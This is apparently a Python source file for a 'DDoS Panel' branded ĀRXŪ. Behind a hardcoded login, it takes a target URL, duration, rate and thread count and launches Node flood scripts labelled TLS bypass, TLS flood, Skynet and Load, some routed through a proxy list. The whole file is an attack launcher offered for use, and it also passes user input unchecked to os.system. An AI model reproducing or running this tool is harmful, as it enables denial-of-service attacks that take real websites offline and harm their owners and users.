import socket
import os
import requests
import random
import getpass
import time
import sys

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def neofetch():
    os.system("neofetch --ascii_colors 4 6 2 5 1 3 --ascii_distro Linux")

def atas():
    print('| \x1b[38;2;0;255;0mWelcome To \x1b[38;2;255;255;255mĀRXŪ DDoS Panel\x1b[38;2;0;255;0m | ')
    print('                              {bots}                                     ')
    print("")

def logo():
    clear()
    neofetch()
    atas()
    print("""
_    ____  __  ___   _
   / \\  |  _ \\ \\ \\/ / | | |
  / _ \\ | |_) | \\  /| | | |
 / ___ \\|  _ <  /  \\| |_| |
/_/   \\_\\_| \\_\\/_/\\_\\\\___/
 """)

def methods():
    print("""

» \x1b[38;2;0;255;0mLayer7:\x1b[38;2;255;255;255m
        \x1b[38;2;0;255;0mTLS1\x1b[38;2;255;255;255m <Target> <Time> <Rate> <threads>
        \x1b[38;2;0;255;0mTLS2\x1b[38;2;255;255;255m <Target> <Time> <Rate> <threads>
        \x1b[38;2;0;255;0mTLS3\x1b[38;2;255;255;255m <Target> <Time> <Rate> <threads>
        \x1b[38;2;0;255;0mTLS4\x1b[38;2;255;255;255m <Target> <Time> <Rate> <threads>
""")

def main():
    logo()
    while True:
        cnc = input('''\x1b[38;2;255;255;255mĀRXŪ@panel\n =>\x1b[38;2;255;255;255m''')
        if cnc == "Methods" or cnc == "METHODS" or cnc == "methods" or cnc == "MTDS":
            methods()
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "Clear":
            main()

        # LAYER 7 METHODS
        elif "TLS1" in cnc:  # TLS BYPASS
            try:
                target = cnc.split()[1]
                time = cnc.split()[2]
                Rate = cnc.split()[3]
                threads = cnc.split()[4]
                os.system(f'node TLS1.js {target} {time} {Rate} {threads}')
            except IndexError:
                print('Usage: TLS1 <Target> <Time> <Rate> <threads> ')
                print('Example: TLS1 https://example.com 120 512 1000')
                print(' Tls-Bypass ')

        elif "TLS2" in cnc:  # TLSFLOOD
            try:
                target = cnc.split()[1]
                time = cnc.split()[2]
                Rate = cnc.split()[3]
                threads = cnc.split()[4]
                proxyFile = cnc.split()[5]
                os.system(f'node TLS2.js {target} {time} {Rate} {threads} proxy.txt')
            except IndexError:
                print('Usage: TLS2 <Target> <Time> <Rate> <threads> ')
                print('Example: TLS2 https://example.com 120 512 1000')
                print(' Tls-Flood ')

        elif "TLS3" in cnc:  # SKYNET
            try:
                target = cnc.split()[1]
                time = cnc.split()[2]
                Rate = cnc.split()[3]
                threads = cnc.split()[4]
                proxyFile = cnc.split()[5]
                os.system(f'node TLS3.js {target} {time} {Rate} {threads} proxy.txt')
            except IndexError:
                print('Usage: TLS3 <Target> <Time> <Rate> <threads> ')
                print('Example: TLS3 https://example.com 120 512 1000')
                print(' Tls-Sky ')

        elif "TLS4" in cnc:  # Load
            try:
                target = cnc.split()[1]
                time = cnc.split()[2]
                Rate = cnc.split()[3]
                threads = cnc.split()[4]
                os.system(f'node TLS4.js {target} {time} {Rate} {threads}')
            except IndexError:
                print('Usage: TLS4 <Target> <Time> <Rate> <threads>')
                print('Example: TLS4  https://example.com 120 512 1000')
                print(' Tls Load ')

        # Except IndexError
        elif "Help" in cnc:
            print(f'''
» Methods : To show methods
» Clear: To clear all messages
            ''')

        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass

# LOG-IN
def login():
    clear()
    neofetch()
    print("\n\x1b[38;2;255;255;255m-------------------------------------------\x1b[0m")
    print("\x1b[38;2;0;255;0m            Welcome to ĀRXŪ Panel!!!...\x1b[0m")
    print("\x1b[38;2;255;255;255m-------------------------------------------\x1b[0m")

    user = "arxu"
    passwd = "hola"
    username = input("\n\x1b[38;2;255;255;255mUsername: \x1b[0m")
    password = getpass.getpass(prompt='\x1b[38;2;255;255;255mPassword: \x1b[0m')
    
    if username != user or password != passwd:
        print("\n\x1b[38;2;255;0;0mSorry, the password you entered is wrong!!!\x1b[0m")
        sys.exit(1)
    elif username == user and password == passwd:
        time.sleep(0.3)
        main()

login()
